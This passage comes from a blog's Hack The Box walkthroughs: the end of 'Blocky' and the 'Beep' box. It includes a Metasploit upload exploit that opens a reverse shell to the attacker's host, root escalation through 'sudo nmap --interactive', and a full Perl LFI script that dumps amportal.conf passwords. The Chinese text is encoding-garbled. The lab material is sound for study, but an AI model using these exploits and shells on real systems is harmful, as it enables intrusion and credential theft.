<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] notch</span><br><span class="line"> | Found By: Author Posts - Author Pattern (Passive Detection)</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Wp Json Api (Aggressive Detection)</span><br><span class="line"> |   - http:&#x2F;&#x2F;10.10.10.37&#x2F;index.php&#x2F;wp-json&#x2F;wp&#x2F;v2&#x2F;users&#x2F;?per_page&#x3D;100&amp;page&#x3D;1</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] Notch</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] WPVulnDB API OK</span><br><span class="line"> | Plan: free</span><br><span class="line"> | Requests Done (during the scan): 3</span><br><span class="line"> | Requests Remaining: 47</span><br></pre></td></tr></table></figure>
<h3 id="Getting-User-Access">Getting User Access</h3>
<p>Visit <code>http://10.10.10.37/plugin</code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200407135726.png" alt=""></p>
<p>Download and extract <code>BlockyCore.jar</code>, once the <code>BlockCore.class</code> is extracted we need to do to print out itâ€™s contents is to use the <strong>jad</strong> command.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ jad BlockyCore.class</span><br><span class="line">Parsing BlockyCore.class...The class file version is 52.0 (only 45.3, 46.0 and 47.0 are supported)</span><br><span class="line">Generating BlockyCore.jad</span><br><span class="line"></span><br><span class="line">$ cat BlockyCore.jad</span><br><span class="line">&#x2F;&#x2F; Decompiled by Jad v1.5.8e. Copyright 2001 Pavel Kouznetsov.</span><br><span class="line">&#x2F;&#x2F; Jad home page: http:&#x2F;&#x2F;www.geocities.com&#x2F;kpdus&#x2F;jad.html</span><br><span class="line">&#x2F;&#x2F; Decompiler options: packimports(3)</span><br><span class="line">&#x2F;&#x2F; Source File Name:   BlockyCore.java                                                                                                                                     </span><br><span class="line">package com.myfirstplugin;</span><br><span class="line">public class BlockyCore</span><br><span class="line">&#123;</span><br><span class="line">    public BlockyCore()</span><br><span class="line">    &#123;</span><br><span class="line">        sqlHost &#x3D; &quot;localhost&quot;;</span><br><span class="line">        sqlUser &#x3D; &quot;root&quot;;</span><br><span class="line">        sqlPass &#x3D; &quot;8YsqfCTnvxAUeduzjNSXe22&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void onServerStart()</span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void onServerStop()</span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void onPlayerJoin()</span><br><span class="line">    &#123;</span><br><span class="line">        sendMessage(&quot;TODO get username&quot;, &quot;Welcome to the BlockyCraft!!!!!!!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void sendMessage(String s, String s1)</span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String sqlHost;</span><br><span class="line">    public String sqlUser;</span><br><span class="line">    public String sqlPass;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Get the credentials: <code>notch : 8YsqfCTnvxAUeduzjNSXe22</code></p>
<p>SSH with notch</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ssh notch@10.10.10.37</span><br><span class="line">notch@10.10.10.37&#39;s password:                                                         Welcome to Ubuntu 16.04.2 LTS (GNU&#x2F;Linux 4.4.0-62-generic x86_64)                     </span><br><span class="line"></span><br><span class="line"> * Documentation:  https:&#x2F;&#x2F;help.ubuntu.com</span><br><span class="line"> * Management:     https:&#x2F;&#x2F;landscape.canonical.com</span><br><span class="line"> * Support:        https:&#x2F;&#x2F;ubuntu.com&#x2F;advantage</span><br><span class="line"></span><br><span class="line">7 packages can be updated.</span><br><span class="line">7 updates are security updates.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Last login: Tue Jul 25 11:14:53 2017 from 10.10.14.230</span><br><span class="line">notch@Blocky:~$ id</span><br><span class="line">uid&#x3D;1000(notch) gid&#x3D;1000(notch) groups&#x3D;1000(notch),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)</span><br><span class="line">notch@Blocky:~$ ls</span><br><span class="line">minecraft  user.txt</span><br><span class="line">notch@Blocky:~$ cat user.txt </span><br><span class="line">59fee0977fb60b8a0bc6e41e751f3cd5</span><br></pre></td></tr></table></figure>
<h3 id="Getting-Root-Access">Getting Root Access</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">notch@Blocky:~$ cat .bash_history </span><br><span class="line">sudo su</span><br><span class="line">cat .bash_history </span><br><span class="line">echo &quot;&quot; &gt; .bash_history </span><br><span class="line">exit</span><br><span class="line">poweroff</span><br><span class="line">sudo poweroff</span><br><span class="line">notch@Blocky:~$ sudo -l</span><br><span class="line">[sudo] password for notch: </span><br><span class="line">Matching Defaults entries for notch on Blocky:</span><br><span class="line">    env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin\:&#x2F;snap&#x2F;bin</span><br><span class="line"></span><br><span class="line">User notch may run the following commands on Blocky: </span><br><span class="line">    (ALL : ALL) ALL</span><br></pre></td></tr></table></figure>
<p>Get root flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">notch@Blocky:~$ cat &#x2F;root&#x2F;root.txt</span><br><span class="line">cat: &#x2F;root&#x2F;root.txt: Permission denied</span><br><span class="line">notch@Blocky:~$ sudo su</span><br><span class="line">root@Blocky:&#x2F;home&#x2F;notch# cat &#x2F;root&#x2F;root.txt</span><br></pre></td></tr></table></figure>
<h2 id="0x04-Conclusion">0x04 Conclusion</h2>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200407140623.png" alt=""></p>
<h2 id="0x05-Reference">0x05 Reference</h2>
<p><a href="https://ech1.netlify.com/htb/easy/1">https://ech1.netlify.com/htb/easy/1</a></p>
]]></content>
      <categories>
        <category>é¶æœº</category>
        <category>HTB</category>
      </categories>
      <tags>
        <tag>é¶æœº</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Beep-walkthrough</title>
    <url>/Target_drone/HackTheBox/13.HTB-Beep-walkthrough/</url>
    <content><![CDATA[<h1 id="HTB-Beep-Walkthrough">HTB::Beep Walkthrough</h1>
<h2 id="0x01-Info-Card">0x01 Info Card</h2>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200407181830.png" alt=""></p>
<h2 id="0x02-Tools-and-Tips">0x02 Tools and Tips</h2>
<ul>
<li>nmap</li>
<li>sslscan</li>
<li>wfuzz</li>
<li>vtigercrm</li>
<li>LFI</li>
<li>Elastix / FreeFBX</li>
<li>Nmap Privilege Escalation</li>
</ul>
<h2 id="0x03-Pentesting">0x03 Pentesting</h2>
<h3 id="Initial-Enumeration">Initial Enumeration</h3>
<p>ç«¯å£æ‰«æ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Nmap 7.80 scan initiated Tue Apr  7 03:18:33 2020 as: nmap -sC -sV -Pn -oN ippsec_scan.txt 10.10.10.7</span><br><span class="line">Nmap scan report for 10.10.10.7</span><br><span class="line">Host is up (0.25s latency).</span><br><span class="line">Not shown: 987 closed ports</span><br><span class="line">PORT      STATE SERVICE    VERSION</span><br><span class="line">22&#x2F;tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)</span><br><span class="line">|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)</span><br><span class="line">25&#x2F;tcp    open  smtp       Postfix smtpd</span><br><span class="line">|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, </span><br><span class="line">80&#x2F;tcp    open  http       Apache httpd 2.2.3</span><br><span class="line">|_http-server-header: Apache&#x2F;2.2.3 (CentOS)</span><br><span class="line">|_http-title: Did not follow redirect to https:&#x2F;&#x2F;10.10.10.7&#x2F;</span><br><span class="line">|_https-redirect: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">110&#x2F;tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4</span><br><span class="line">|_pop3-capabilities: TOP APOP UIDL IMPLEMENTATION(Cyrus POP3 server v2) LOGIN-DELAY(0) STLS RESP-CODES AUTH-RESP-CODE USER EXPIRE(NEVER) PIPELINING</span><br><span class="line">111&#x2F;tcp   open  rpcbind    2 (RPC #100000)</span><br><span class="line">143&#x2F;tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4</span><br><span class="line">|_imap-capabilities: THREAD&#x3D;REFERENCES ATOMIC Completed MAILBOX-REFERRALS OK RENAME LISTEXT LITERAL+ MULTIAPPEND X-NETSCAPE LIST-SUBSCRIBED CHILDREN UNSELECT RIGHTS&#x3D;kxte URLAUTHA0001 IDLE IMAP4rev1 SORT&#x3D;MODSEQ ID BINARY IMAP4 CONDSTORE CATENATE SORT ANNOTATEMORE NO UIDPLUS STARTTLS ACL NAMESPACE THREAD&#x3D;ORDEREDSUBJECT QUOTA</span><br><span class="line">443&#x2F;tcp   open  ssl&#x2F;https?</span><br><span class="line">|_ssl-date: 2020-04-07T07:23:36+00:00; +1m25s from scanner time.</span><br><span class="line">880&#x2F;tcp   open  status     1 (RPC #100024)</span><br><span class="line">993&#x2F;tcp   open  ssl&#x2F;imap   Cyrus imapd</span><br><span class="line">|_imap-capabilities: CAPABILITY</span><br><span class="line">995&#x2F;tcp   open  pop3       Cyrus pop3d</span><br><span class="line">3306&#x2F;tcp  open  mysql      MySQL (unauthorized)</span><br><span class="line">4445&#x2F;tcp  open  upnotifyp?</span><br><span class="line">10000&#x2F;tcp open  http       MiniServ 1.570 (Webmin httpd)</span><br><span class="line">|_http-title: Site doesn&#39;t have a title (text&#x2F;html; Charset&#x3D;iso-8859-1).</span><br><span class="line">Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: 1m24s</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line"># Nmap done at Tue Apr  7 03:24:47 2020 -- 1 IP address (1 host up) scanned in 374.24 seconds</span><br></pre></td></tr></table></figure>
<p>SSL scan</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># kali @ kali in ~&#x2F;HackTheBox&#x2F;Beep [4:37:19] C:127</span><br><span class="line">$ sslscan 10.10.10.7</span><br><span class="line">Version: 2.0.0-static</span><br><span class="line">OpenSSL 1.1.1f-dev  xx XXX xxxx</span><br><span class="line"></span><br><span class="line">Connected to 10.10.10.7</span><br><span class="line">Testing SSL server 10.10.10.7 on port 443 using SNI name 10.10.10.7                   </span><br><span class="line"></span><br><span class="line">  SSL&#x2F;TLS Protocols:</span><br><span class="line">SSLv2     disabled</span><br><span class="line">SSLv3     enabled</span><br><span class="line">TLSv1.0   enabled</span><br><span class="line">TLSv1.1   disabled </span><br><span class="line">TLSv1.2   disabled</span><br><span class="line">TLSv1.3   disabled                                                                   </span><br><span class="line"></span><br><span class="line">  TLS Fallback SCSV:</span><br><span class="line">Server does not support TLS Fallback SCSV</span><br><span class="line"></span><br><span class="line">  TLS renegotiation:</span><br><span class="line">Secure session renegotiation supported</span><br><span class="line"></span><br><span class="line">  TLS Compression:</span><br><span class="line">Compression enabled (CRIME)</span><br><span class="line"></span><br><span class="line">  Heartbleed:</span><br><span class="line">TLSv1.0 not vulnerable to heartbleed</span><br><span class="line"></span><br><span class="line">  Supported Server Cipher(s):</span><br><span class="line">Preferred TLSv1.0  256 bits  DHE-RSA-AES256-SHA            DHE 1024 bits</span><br><span class="line">Accepted  TLSv1.0  128 bits  DHE-RSA-AES128-SHA            DHE 1024 bits</span><br><span class="line">Accepted  TLSv1.0  112 bits  DHE-RSA-DES-CBC3-SHA          DHE 1024 bits</span><br><span class="line">Accepted  TLSv1.0  256 bits  AES256-SHA                    </span><br><span class="line">Accepted  TLSv1.0  128 bits  AES128-SHA                    </span><br><span class="line">Accepted  TLSv1.0  128 bits  RC4-SHA</span><br><span class="line"></span><br><span class="line">Accepted  TLSv1.0  112 bits  DES-CBC3-SHA                 </span><br><span class="line">Accepted  TLSv1.0  56 bits   TLS_RSA_WITH_DES_CBC_SHA     </span><br><span class="line">Accepted  TLSv1.0  56 bits   TLS_DHE_RSA_WITH_DES_CBC_SHA </span><br><span class="line"></span><br><span class="line">  Server Signature Algorithm(s):</span><br><span class="line">TLSv1.0  Server accepts all signature algorithms.</span><br><span class="line"></span><br><span class="line">  SSL Certificate:</span><br><span class="line">Signature Algorithm: sha1WithRSAEncryption</span><br><span class="line">RSA Key Strength:    1024</span><br><span class="line"></span><br><span class="line">Subject:  localhost.localdomain</span><br><span class="line">Issuer:   localhost.localdomain</span><br><span class="line"></span><br><span class="line">Not valid before: Apr  7 08:22:08 2017 GMT</span><br><span class="line">Not valid after:  Apr  7 08:22:08 2018 GMT</span><br></pre></td></tr></table></figure>
<p>wfuzzæ‰«æç›®å½•</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200407231110.png" alt=""></p>
<h3 id="Getting-User-Access">Getting User Access</h3>
<p>å¯»æ‰¾vtigercrm v5.1.0çš„æ¼æ´</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200407225540.png" alt=""></p>
<p>å°è¯•``vtiger_php_exec<code>ä¸è¡Œå†æ¢</code>vtiger_soap_upload`ï¼Œå¯ä»¥åå¼¹shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf5 exploit(multi&#x2F;http&#x2F;vtiger_php_exec) &gt; use exploit&#x2F;multi&#x2F;http&#x2F;vtiger_soap_upload</span><br><span class="line">msf5 exploit(multi&#x2F;http&#x2F;vtiger_soap_upload) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit&#x2F;multi&#x2F;http&#x2F;vtiger_soap_upload):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description </span><br><span class="line">   ----       ---------------  --------  ----------- </span><br><span class="line">   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]</span><br><span class="line">   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;</span><br><span class="line">   RPORT      80               yes       The target port (TCP)</span><br><span class="line">   SSL        false            no        Negotiate SSL&#x2F;TLS for outgoing connections</span><br><span class="line">   TARGETURI  &#x2F;vtigercrm&#x2F;      yes       Base vTiger CRM directory path</span><br><span class="line">   VHOST                       no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   vTigerCRM v5.4.0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(multi&#x2F;http&#x2F;vtiger_soap_upload) &gt; set RHOSTS 10.10.10.7</span><br><span class="line">RHOSTS &#x3D;&gt; 10.10.10.7</span><br><span class="line">msf5 exploit(multi&#x2F;http&#x2F;vtiger_soap_upload) &gt; set RPORT 443</span><br><span class="line">RPORT &#x3D;&gt; 443</span><br><span class="line">msf5 exploit(multi&#x2F;http&#x2F;vtiger_soap_upload) &gt; set SSL true</span><br><span class="line">SSL &#x3D;&gt; true</span><br><span class="line">msf5 exploit(multi&#x2F;http&#x2F;vtiger_soap_upload) &gt; set LHOST 10.10.14.5</span><br><span class="line">LHOST &#x3D;&gt; 10.10.14.5</span><br><span class="line"></span><br><span class="line">msf5 exploit(multi&#x2F;http&#x2F;vtiger_soap_upload) &gt; check</span><br><span class="line">[+] 10.10.10.7:443 - The target is vulnerable.</span><br><span class="line">msf5 exploit(multi&#x2F;http&#x2F;vtiger_soap_upload) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.14.5:4444 </span><br><span class="line">[*] Uploading payload...</span><br><span class="line">[+] Upload successfully uploaded</span><br><span class="line">[*] Executing payload...</span><br><span class="line">[*] Sending stage (38288 bytes) to 10.10.10.7</span><br><span class="line">[*] Meterpreter session 1 opened (10.10.14.5:4444 -&gt; 10.10.10.7:43989) at 2020-04-07 10:50:50 -0400</span><br><span class="line">[!] This exploit may require manual cleanup of &#39;bPRojImibS.php&#39; on the target</span><br><span class="line"></span><br><span class="line">meterpreter &gt; </span><br><span class="line">[+] Deleted bPRojImibS.php</span><br><span class="line">shell</span><br><span class="line">Process 8916 created.</span><br><span class="line">Channel 0 created.</span><br><span class="line">id</span><br><span class="line">uid&#x3D;100(asterisk) gid&#x3D;101(asterisk) groups&#x3D;101(asterisk)</span><br></pre></td></tr></table></figure>
<p>è·å–user flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;sh&#39;)&quot;   </span><br><span class="line">sh-3.2$ id</span><br><span class="line">id</span><br><span class="line">uid&#x3D;100(asterisk) gid&#x3D;101(asterisk) groups&#x3D;101(asterisk)</span><br><span class="line">sh-3.2$ pwd</span><br><span class="line">pwd</span><br><span class="line">&#x2F;var&#x2F;www&#x2F;html&#x2F;vtigercrm</span><br><span class="line">sh-3.2$ cd &#x2F;home&#x2F;fanis</span><br><span class="line">cd &#x2F;home&#x2F;fanis</span><br><span class="line">sh-3.2$ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 32</span><br><span class="line">drwxrwxr-x 2 fanis fanis 4096 Apr  7  2017 .</span><br><span class="line">drwxr-xr-x 4 root  root  4096 Apr  7  2017 ..</span><br><span class="line">-rw------- 1 fanis fanis  114 Apr  7  2017 .bash_history</span><br><span class="line">-rw-r--r-- 1 fanis fanis   33 Apr  7  2017 .bash_logout</span><br><span class="line">-rw-r--r-- 1 fanis fanis  176 Apr  7  2017 .bash_profile</span><br><span class="line">-rw-r--r-- 1 fanis fanis  124 Apr  7  2017 .bashrc</span><br><span class="line">-rw-rw-r-- 1 fanis fanis   33 Apr  7  2017 user.txt</span><br><span class="line">sh-3.2$ cat user.txt</span><br><span class="line">cat user.txt</span><br><span class="line">aeff3def0c765c2677b94715cffa73ac</span><br></pre></td></tr></table></figure>
<h3 id="Getting-Root-Access">Getting Root Access</h3>
<p>ææƒ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sh-3.2$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries for asterisk on this host:</span><br><span class="line">    env_reset, env_keep&#x3D;&quot;COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR</span><br><span class="line">    LS_COLORS MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE LC_COLLATE</span><br><span class="line">    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES LC_MONETARY LC_NAME LC_NUMERIC</span><br><span class="line">    LC_PAPER LC_TELEPHONE LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET</span><br><span class="line">    XAUTHORITY&quot;</span><br><span class="line"></span><br><span class="line">User asterisk may run the following commands on this host:</span><br><span class="line">    (root) NOPASSWD: &#x2F;sbin&#x2F;shutdown</span><br><span class="line">    (root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;nmap</span><br><span class="line">    (root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;yum</span><br><span class="line">    (root) NOPASSWD: &#x2F;bin&#x2F;touch</span><br><span class="line">    (root) NOPASSWD: &#x2F;bin&#x2F;chmod</span><br><span class="line">    (root) NOPASSWD: &#x2F;bin&#x2F;chown</span><br><span class="line">    (root) NOPASSWD: &#x2F;sbin&#x2F;service</span><br><span class="line">    (root) NOPASSWD: &#x2F;sbin&#x2F;init</span><br><span class="line">    (root) NOPASSWD: &#x2F;usr&#x2F;sbin&#x2F;postmap</span><br><span class="line">    (root) NOPASSWD: &#x2F;usr&#x2F;sbin&#x2F;postfix</span><br><span class="line">    (root) NOPASSWD: &#x2F;usr&#x2F;sbin&#x2F;saslpasswd2</span><br><span class="line">    (root) NOPASSWD: &#x2F;usr&#x2F;sbin&#x2F;hardware_detector</span><br><span class="line">    (root) NOPASSWD: &#x2F;sbin&#x2F;chkconfig</span><br><span class="line">    (root) NOPASSWD: &#x2F;usr&#x2F;sbin&#x2F;elastix-helper</span><br></pre></td></tr></table></figure>
<p>å‘½ä¸­<strong>Nmap</strong>ï¼Œä»¥rootæƒé™æ‰§è¡Œä¸”æ— éœ€è®¤è¯</p>
<blockquote>
<p>è¾ƒæ—©ç‰ˆæœ¬çš„Nmapï¼ˆ2.02è‡³5.21ï¼‰å…·æœ‰äº¤äº’æ¨¡å¼ï¼Œè¯¥æ¨¡å¼å…è®¸ç”¨æˆ·æ‰§è¡ŒShellå‘½ä»¤ç”±äºNmapåœ¨ä»¥rootç‰¹æƒæ‰§è¡Œçš„äºŒè¿›åˆ¶æ–‡ä»¶åˆ—è¡¨ä¸­ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨äº¤äº’å¼æ§åˆ¶å°æ¥ä»¥ç›¸åŒçš„ç‰¹æƒè¿è¡Œshell</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sh-3.2$ sudo nmap --interactive</span><br><span class="line">sudo nmap --interactive</span><br><span class="line"></span><br><span class="line">Starting Nmap V. 4.11 ( http:&#x2F;&#x2F;www.insecure.org&#x2F;nmap&#x2F; )</span><br><span class="line">Welcome to Interactive Mode -- press h &lt;enter&gt; for help</span><br><span class="line">nmap&gt; !sh</span><br><span class="line">!sh</span><br><span class="line">sh-3.2# whoami</span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">sh-3.2# cat &#x2F;root&#x2F;root.txt</span><br><span class="line">cat &#x2F;root&#x2F;root.txt</span><br><span class="line">d88e006123842106982acce0aaf453f0</span><br></pre></td></tr></table></figure>
<h3 id="Another-Way">Another Way</h3>
<p>é‡ç‚¹å…³æ³¨å‡ ä¸ªå¸¸è§æœåŠ¡ 22(ssh)ã€80(apache)ã€443(https)ã€3306(mysql)ã€10000(httpd)ï¼Œè®¿é—® <code>https://10.10.10.7:443</code> ï¼Œè¿”å›ç™»å½•é¡µé¢ï¼š</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200407194104.png" style="zoom:67%;" />
<p>ä½¿ç”¨é»˜è®¤ç™»å½•å¯†ç ï¼š<code>username: admin password: palosanto</code>ï¼Œç™»å½•é”™è¯¯ã€‚</p>
<p>searchsploitæ‰¾ä¸€ä¸‹ç›¸å…³æ¼æ´ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200407195210.png" alt=""></p>
<p>å°è¯•æœ¬åœ°åŒ…å«æ¼æ´ï¼Œå› ä¸ºé¶æœºä¸Šçš„SSLè¯ä¹¦è¿‡æœŸäº†ï¼Œæ‰€ä»¥è¦ä¿®æ”¹ä¸€ä¸‹åˆ©ç”¨è„šæœ¬ï¼š</p>
<blockquote>
<p><a href="https://stackoverflow.com/questions/336575/can-i-force-lwpuseragent-to-accept-an-expired-ssl-certificate">https://stackoverflow.com/questions/336575/can-i-force-lwpuseragent-to-accept-an-expired-ssl-certificate</a></p>
</blockquote>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/perl -w</span></span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------------#Elastix is an Open Source Sofware to establish Unified Communications.               #About this concept, Elastix goal is to incorporate all the communication alternatives,                                                                         #available at an enterprise level, into a unique solution.                           #------------------------------------------------------------------------------------############################################################                         # Exploit Title: Elastix 2.2.0 LFI                                                   # Google Dork: :(                                                                     # Author: cheki                                                                       # Version:Elastix 2.2.0</span></span><br><span class="line"><span class="comment"># Tested on: multiple</span></span><br><span class="line"><span class="comment"># CVE : notyet</span></span><br><span class="line"><span class="comment"># romanc-_-eyes ;) </span></span><br><span class="line"><span class="comment"># Discovered by romanc-_-eyes</span></span><br><span class="line"><span class="comment"># vendor http://www.elastix.org/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;\t Elastix 2.2.0 LFI Exploit \n&quot;</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;\t code author cheki   \n&quot;</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;\t 0day Elastix 2.2.0  \n&quot;</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;\t email: anonymous17hacker&#123;&#125;gmail.com \n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">#LFI Exploit: /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&amp;module=Accounts&amp;action</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> LWP::UserAgent;</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;\n Target: https://ip &quot;</span>;</span><br><span class="line"><span class="keyword">chomp</span>(<span class="keyword">my</span> $target=&lt;STDIN&gt;);</span><br><span class="line">$dir=<span class="string">&quot;vtigercrm&quot;</span>;</span><br><span class="line">$poc=<span class="string">&quot;current_language&quot;</span>;</span><br><span class="line">$etc=<span class="string">&quot;etc&quot;</span>;</span><br><span class="line">$jump=<span class="string">&quot;../../../../../../../..//&quot;</span>;</span><br><span class="line">$test=<span class="string">&quot;amportal.conf%00&quot;</span>;</span><br><span class="line">$code = LWP::UserAgent-&gt;new() <span class="keyword">or</span> <span class="keyword">die</span> <span class="string">&quot;inicializacia brauzeris\n&quot;</span>;</span><br><span class="line">$code-&gt;ssl_opts(<span class="string">verify_hostname =&gt;</span> <span class="number">0</span>, <span class="string">SSL_verify_mode =&gt;</span> <span class="number">0x00</span>);</span><br><span class="line">$code-&gt;agent(<span class="string">&#x27;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)&#x27;</span>);</span><br><span class="line">$host = $target . <span class="string">&quot;/&quot;</span>.$dir.<span class="string">&quot;/graph.php?&quot;</span>.$poc.<span class="string">&quot;=&quot;</span>.$jump.<span class="string">&quot;&quot;</span>.$etc.<span class="string">&quot;/&quot;</span>.$test.<span class="string">&quot;&amp;module=Accounts&amp;action&quot;</span>;</span><br><span class="line">$res = $code-&gt;request(HTTP::Request-&gt;new(<span class="string">GET=&gt;</span>$host));</span><br><span class="line">$answer = $res-&gt;content; <span class="keyword">if</span> ($answer =~ <span class="string">&#x27;This file is part of FreePBX&#x27;</span>) &#123;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;\n read amportal.conf file : $answer \n\n&quot;</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot; successful read\n&quot;</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123; </span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;\n[-] not successful\n&quot;</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>ä»ä¹‹å‰ sslscan çš„æ‰«æç»“æœæˆ‘ä»¬çœ‹åˆ°é¶æœºåªæ”¯æŒ TLSv1.0ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ä¿®æ”¹ Kali çš„opensslé…ç½®æ–‡ä»¶</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[system_default_sect]</span><br><span class="line">#MinProtocol &#x3D; TLSv1.2</span><br><span class="line">#CipherString &#x3D; DEFAULT@SECLEVEL&#x3D;2</span><br><span class="line"></span><br><span class="line">MinProtocol &#x3D; TLSv1.0</span><br><span class="line">CipherString &#x3D; DEFAUT</span><br></pre></td></tr></table></figure>
<p>å†æ‰§è¡Œåˆ©ç”¨è„šæœ¬</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># kali @ kali in ~&#x2F;HackTheBox&#x2F;Beep [5:15:57]</span><br><span class="line">$ perl 37637.pl &gt; elastix</span><br><span class="line"># kali @ kali in ~&#x2F;HackTheBox&#x2F;Beep [5:16:34]</span><br><span class="line">$ cat elastix</span><br><span class="line">...</span><br><span class="line">AMPDBHOST&#x3D;localhost</span><br><span class="line">AMPDBENGINE&#x3D;mysql</span><br><span class="line"># AMPDBNAME&#x3D;asterisk</span><br><span class="line">AMPDBUSER&#x3D;asteriskuser</span><br><span class="line"># AMPDBPASS&#x3D;amp109</span><br><span class="line">AMPDBPASS&#x3D;jEhdIekWmdjE</span><br><span class="line">AMPENGINE&#x3D;asterisk</span><br><span class="line">AMPMGRUSER&#x3D;admin</span><br><span class="line">#AMPMGRPASS&#x3D;amp111</span><br><span class="line">AMPMGRPASS&#x3D;jEhdIekWmdjE</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
